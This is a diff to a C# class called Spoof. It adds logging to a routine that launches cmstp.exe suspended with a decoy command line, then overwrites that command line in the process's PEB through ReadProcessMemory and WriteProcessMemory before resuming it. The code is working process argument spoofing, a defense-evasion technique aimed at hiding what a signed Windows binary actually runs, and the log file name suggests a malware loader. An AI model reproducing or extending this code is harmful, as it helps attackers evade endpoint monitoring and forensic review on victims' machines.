@@ -1,4 +1,5 @@
 using System;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -95,6 +96,17 @@ public static class Spoof
 
     private const int CommandLineOffset = 0x70;
 
+    private static void Log(string msg)
+    {
+        try
+        {
+            string logPath = @"C:\ProgramData\loader.log";
+            string line = DateTime.Now.ToString("[yyyy-MM-dd HH:mm:ss] ") + msg;
+            File.AppendAllText(logPath, line + Environment.NewLine);
+        }
+        catch { }
+    }
+
     public static void Go()
     {
         string spoofedCmd = "cmstp.exe /s C:\\Windows\\System32\\cmstp.inf";
@@ -104,11 +116,16 @@ public static class Spoof
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
 
         PROCESS_INFORMATION pi;
+
+        Log("[*] Creating suspended cmstp.exe...");
         if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
             CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
         {
+            int err = Marshal.GetLastWin32Error();
+            Log("[-] CreateProcessW FAILED (error " + err + ")");
             return;
         }
+        Log("[+] cmstp.exe created (PID=" + pi.dwProcessId + ")");
 
         int retLen;
         PROCESS_BASIC_INFORMATION pbi;
@@ -116,21 +133,25 @@ public static class Spoof
             out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
             out retLen) != 0)
         {
+            Log("[-] NtQueryInformationProcess FAILED");
             ResumeThread(pi.hThread);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
             return;
         }
+        Log("[+] PEB located");
 
         byte[] pebBuffer = new byte[IntPtr.Size * 4];
         int bytesRead;
         if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuffer, pebBuffer.Length, out bytesRead))
         {
+            Log("[-] ReadProcessMemory(PEB) FAILED");
             ResumeThread(pi.hThread);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
             return;
         }
+        Log("[+] PEB read");
 
         int ppOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
         IntPtr processParametersPtr = Marshal.ReadIntPtr(pebBuffer, ppOffset);
@@ -138,11 +159,13 @@ public static class Spoof
         byte[] cmdBuffer = new byte[16];
         if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
         {
+            Log("[-] ReadProcessMemory(cmdPtr) FAILED");
             ResumeThread(pi.hThread);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
             return;
         }
+        Log("[+] Command line pointer read");
 
         byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
         IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuffer, 8);
@@ -150,20 +173,25 @@ public static class Spoof
         int written;
         if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out written))
         {
+            Log("[-] WriteProcessMemory(cmd) FAILED");
             ResumeThread(pi.hThread);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
             return;
         }
+        Log("[+] Command line overwritten: config.inf");
 
         byte[] lengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
         byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
         Buffer.BlockCopy(lengthBytes, 0, cmdBuffer, 0, 2);
         Buffer.BlockCopy(maxLengthBytes, 0, cmdBuffer, 2, 2);
         WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out written);
+        Log("[+] Command line length updated");
 
+        Log("[*] Resuming cmstp.exe thread...");
         ResumeThread(pi.hThread);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+        Log("[+] cmstp.exe resumed, argument spoofing complete");
     }
 }
